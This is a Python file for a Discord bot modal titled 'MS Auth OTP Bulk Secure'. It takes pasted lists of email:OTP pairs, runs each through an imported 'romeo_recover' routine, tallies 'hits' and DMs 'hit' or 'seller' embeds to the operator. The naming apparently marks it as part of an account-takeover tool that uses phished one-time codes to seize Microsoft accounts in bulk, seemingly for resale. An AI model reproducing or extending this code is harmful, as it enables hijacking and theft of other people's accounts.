from discord import ui
import discord
import logging
from datetime import datetime, timezone

from authsecuring.recover import romeo_recover
from authsecuring.embed_builder import build_failure_embed
from views.modals.bulk_utils import _secure_one

rom = logging.getLogger(__name__)


class OtpBulkModal(ui.Modal):
    """Bulk MS Auth OTP secure — multi-line email:otp pairs."""

    def __init__(self):
        super().__init__(title="MS Auth OTP Bulk Secure", timeout=600)

        self.lines_input = ui.InputText(
            label="Email + OTP lines",
            placeholder="user1@gmail.com:123456\nuser2@example.com:654321",
            required=True,
            style=discord.InputTextStyle.paragraph,
            max_length=10000,
        )
        self.add_item(self.lines_input)

    async def callback(self, interaction: discord.Interaction):
        lines_raw = self.lines_input.value.strip()
        lines = [l.strip() for l in lines_raw.splitlines() if l.strip()]

        await interaction.response.defer(ephemeral=True)

        total = len(lines)
        processed = 0
        hits = 0
        failures = 0

        summary = discord.Embed(
            title="📊 OTP Bulk Secure — Summary",
            color=0x5865F2,
            timestamp=datetime.now(timezone.utc),
        )
        summary.add_field(name="Total Lines", value=str(total), inline=True)
        summary.add_field(name="Processed", value="0", inline=True)
        summary.add_field(name="Hits", value="0", inline=True)
        summary.add_field(name="Failed", value="0", inline=True)

        msg = await interaction.followup.send(embed=summary, ephemeral=True)

        async def _on_each(
            idx: int,
            email: str,
            result: dict | str | None,
        ):
            nonlocal processed, hits, failures

            processed += 1

            hit_embed = None
            if isinstance(result, dict) and result.get("failed"):
                hit_embed = result.get("hit_embed") or result.get("seller_embed")
            elif isinstance(result, dict) and result.get("hit_embed"):
                hits += 1
                hit_embed = result.get("hit_embed")
            elif result is None or result == "invalid":
                failures += 1
            else:
                failures += 1

            summary.set_field_at(
                1, name="Processed", value=str(processed), inline=True
            )
            summary.set_field_at(
                2, name="Hits", value=str(hits), inline=True
            )
            summary.set_field_at(
                3, name="Failed", value=str(failures), inline=True
            )
            await msg.edit(embeds=[summary])

            if hit_embed:
                try:
                    await interaction.user.send(embed=hit_embed)
                except discord.Forbidden:
                    pass

        for i, line in enumerate(lines, 1):
            parts = line.split(":", 1)
            if len(parts) != 2:
                failures += 1
                await _on_each(i, line, None)
                continue

            email, otp_code = parts[0].strip(), parts[1].strip()

            try:
                result = await romeo_recover(
                    email=email,
                    method="msauth",
                    data={
                        "otp_code": otp_code,
                        "request_otp": False,
                    },
                )
            except Exception as exc:
                rom.warning("otp bulk[%s] %s failed: %s", i, email, exc)
                result = None

            await _on_each(i, email, result)

        if failures == 0:
            summary.color = 0x57F287
            summary.title = "✅ OTP Bulk Complete — All Secured"
        elif hits > 0:
            summary.color = 0xF1C40F
            summary.title = "⚠️ OTP Bulk Done — Partial Success"
        else:
            summary.color = 0xFA4343
            summary.title = "❌ OTP Bulk — All Failed"

        await msg.edit(embeds=[summary])
